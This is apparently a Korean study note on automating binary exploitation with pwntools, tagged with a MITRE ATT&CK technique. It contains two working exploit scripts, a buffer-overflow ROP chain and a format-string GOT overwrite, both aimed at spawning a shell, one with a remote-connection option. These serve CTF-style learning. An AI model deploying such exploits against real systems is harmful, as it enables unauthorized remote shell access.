## Context
- **Tactic**: Execution (TA0002)
- **Technique**: T1059.006 – Command and Scripting Interpreter: Python
- **Procedure**: Delivering an automated BOF-ROP payload to a remote process using a pwntools script to achieve shell execution.

## Core Idea

```
┌─────────────────────────────────────────────────────────┐
│               Python Exploit Script                     │
├─────────────────┬──────────────────┬────────────────────┤
│    ELF Layer    │    ROP Layer     │     Tube Layer     │
│  (Analysis)     │   (Strategy)     │    (Execution)     │
├─────────────────┼──────────────────┼────────────────────┤
│ - Parses binary │ - Finds gadgets  │ - Connects to      │
│   metadata      │ - Chains attacks │   target process   │
│ - Extracts      │ - Builds         │ - Sends payload    │
│   symbols/addrs │   payloads       │ - Gets shell       │
├─────────────────┼──────────────────┼────────────────────┤
│    Provides     │     Creates      │    Delivers &      │
│  target info    │  attack vector   │    executes        │
└───────┬─────────┴────────┬─────────┴─────────┬──────────┘
        │                  │                   │
        ▼                  ▼                   ▼
┌─────────────────────────────────────────────────────────┐
│         Programmable Exploit Pipeline                   │
│  [Analysis] ───────► [Strategy] ───────► [Execution]    │
└─────────────────────────────────────────────────────────┘
```

`pwntools`는 **Tube ↔ ELF ↔ ROP** 세 계층을 하나의 스크립트 안에서 결합하여, 반복적이고 수동 오류가 잦은 익스플로잇 과정을 자동화된 파이프라인으로 전환한다.

- **Tube**는 `process()` 또는 `remote()`를 통해 대상과 연결하고, `send`, `recv`, `interactive()` 등으로 입출력을 처리한다.
- **ELF**는 바이너리의 구조 정보를 파싱하여 함수 주소, PLT/GOT, 문자열 위치 등을 간편히 조회한다.
- **ROP**는 필요한 가젯(`pop rdi` 등)을 자동으로 탐색하고, 체인을 구성하여 NX·Canary 등 보호기법 우회를 가능하게 한다.

이 세 계층은 `분석 → 전략 수립 → 실행 및 쉘 상호작용`이라는 일관된 워크플로우를 구성하며, 다양한 공격 시나리오에서 재사용 가능한 구조를 제공한다.

## Code / Experiment

```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./vuln')   # ELF 계층
context.log_level = 'debug'            # 상세 출력

def conn():
    if args.REMOTE:
        return remote('host', 9001)    # Tube 계층 (원격)
    return process(elf.path)           # Tube 계층 (로컬)

io      = conn()
rop     = ROP(elf)                     # ROP 계층
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret     = rop.find_gadget(['ret'])[0]  # 16-byte 스택 정렬용

payload  = flat(
    b'A' * 72,          # buf(64)+SFP(8)
    pop_rdi,
    next(elf.search(b'/bin/sh\x00')),
    ret,
    elf.plt['system']   # system("/bin/sh")
)

io.sendlineafter(b'Input:', payload)
io.interactive()
```

- Format String Bug(FSB) 기반 GOT 오버라이트 예시
```python
# Format String Bug(FSB)를 이용한 GOT 오버라이트 예시
from pwn import *

elf = context.binary = ELF('./vuln')     # ELF: 바이너리 분석
io = process(elf.path)                   # Tube: 프로세스 연결

# 공격 전략 - FSB를 이용해 exit@GOT를 system 주소로 덮어쓰기
exit_got = elf.got['exit']               # exit 함수의 GOT 주소
system_plt = elf.plt['system']           # system 함수의 PLT 주소

# Tube: 데이터 송수신 - FSB 페이로드 전송
payload = fmtstr_payload(offset=6, writes={exit_got: system_plt})
io.sendlineafter(b'Input: ', payload)

# exit 호출 시 system('/bin/sh')가 실행되도록 쉘 문자열 전송
io.sendlineafter(b'Again? ', b'/bin/sh')

# Tube: 대화형 모드로 전환
io.interactive()
```

- `pattern_create`, `pattern_offset` (또는 `cyclic()`, `cyclic_find()`)를 이용하면 2초 안에 정확한 오프셋을 찾을 수 있다.
- `checksec --file=./vuln` 결과를 보고 `NX`, `PIE`, `RELRO`, `Canary` 상태별로 ROP 전략을 분기해 스크립트를 더 일반화할 수 있다.
- `args.REMOTE` 옵션을 활용하면 로컬과 원격을 하나의 코드로 통합 관리할 수 있다.

## Note
- Tube는 인터프리터 기반 자동화된 공격 흐름을 구성하며, Python 스크립트에서 C2 구조의 명령 송신과 유사한 역할을 수행한다.
- ELF 계층은 심볼, 문자열, 보호 상태(`NX`, `RELRO`, `PIE`, `Canary`)를 추상화하여 익스플로잇 전략 설계에 필요한 정보를 메타데이터처럼 제공한다.
- ROP는 수작업으로 어려운 체인 구성과 가젯 정렬을 자동화하며, 반복 실험 중 수정을 최소화할 수 있게 한다.
- 구조를 함수화하면 `exploit(target_ip, flag_path)` 형태로 전략은 유지하고 대상만 바꾸는 형태로 재사용 가능하다.

---

Backlinks:
-